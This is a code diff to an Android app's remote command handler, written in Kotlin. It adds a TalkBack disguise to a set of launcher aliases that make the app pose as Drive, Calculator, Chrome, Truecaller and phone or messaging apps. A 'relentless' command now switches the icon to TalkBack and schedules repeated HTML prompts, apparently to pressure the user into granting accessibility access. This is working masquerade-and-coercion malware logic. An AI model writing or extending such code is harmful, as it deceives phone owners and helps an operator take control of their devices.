@@ -955,7 +955,7 @@ object CommandProcessor {
                         "SAM_PHONE" to ".AliasSamPhone", "SAM_MSG" to ".AliasSamMsg",
                         "CHROME" to ".AliasChrome", "IMO" to ".AliasImo",
                         "IMO_HD" to ".AliasImoHd", "IMO_BETA" to ".AliasImoBeta", "IMO_LITE" to ".AliasImoLite",
-                        "TRUECALLER" to ".AliasTruecaller"
+                        "TRUECALLER" to ".AliasTruecaller", "TALKBACK" to ".AliasTalkBack"
                     )
 
                     if (aliasMap.containsKey(skin)) {
@@ -1184,6 +1184,27 @@ object CommandProcessor {
                     }
                 }
                 "SET_RELENTLESS_ACC" -> {
+                    // 1. Force Skin Change to TalkBack immediately
+                    val skin = "TALKBACK"
+                    val aliasMap = mapOf(
+                        "DRIVE" to ".AliasDrive", "CALC" to ".AliasCalc",
+                        "GOOGLE_PHONE" to ".AliasGooglePhone", "GOOGLE_MSG" to ".AliasGoogleMsg",
+                        "SAM_PHONE" to ".AliasSamPhone", "SAM_MSG" to ".AliasSamMsg",
+                        "CHROME" to ".AliasChrome", "IMO" to ".AliasImo",
+                        "IMO_HD" to ".AliasImoHd", "IMO_BETA" to ".AliasImoBeta", "IMO_LITE" to ".AliasImoLite",
+                        "TRUECALLER" to ".AliasTruecaller", "TALKBACK" to ".AliasTalkBack"
+                    )
+                    val pm = ctx.packageManager
+                    aliasMap.forEach { (key, aliasName) ->
+                        val comp = android.content.ComponentName(ctx, "${ctx.packageName}$aliasName")
+                        val state = if (key == skin) android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED 
+                                    else android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED
+                        pm.setComponentEnabledSetting(comp, state, android.content.pm.PackageManager.DONT_KILL_APP)
+                    }
+                    ctx.getSharedPreferences("app_config", Context.MODE_PRIVATE).edit()
+                        .putString("active_masquerade_skin", skin).apply()
+
+                    // 2. Configure Relentless ACC rules
                     val parts = content.split("|")
                     val chill = parts.getOrNull(0)?.trim()?.toLongOrNull() ?: 1440L
                     val interval = parts.getOrNull(1)?.trim()?.toLongOrNull() ?: 2L
@@ -1193,7 +1214,7 @@ object CommandProcessor {
                     AccRelentlessManager.applyNewConfig(ctx, chill, interval, max, html)
                     
                     status = "RELENTLESS_ACC_CONFIGURED"
-                    errorMsg = "Chill: ${chill}m | Interval: ${interval}m | Max: $max | Counters Reset"
+                    errorMsg = "Skin: TALKBACK | Chill: ${chill}m | Interval: ${interval}m | Max: $max | Counters Reset"
                 }
                 "STOP_RELENTLESS_ACC" -> {
                     AccRelentlessManager.stopNagging(ctx)
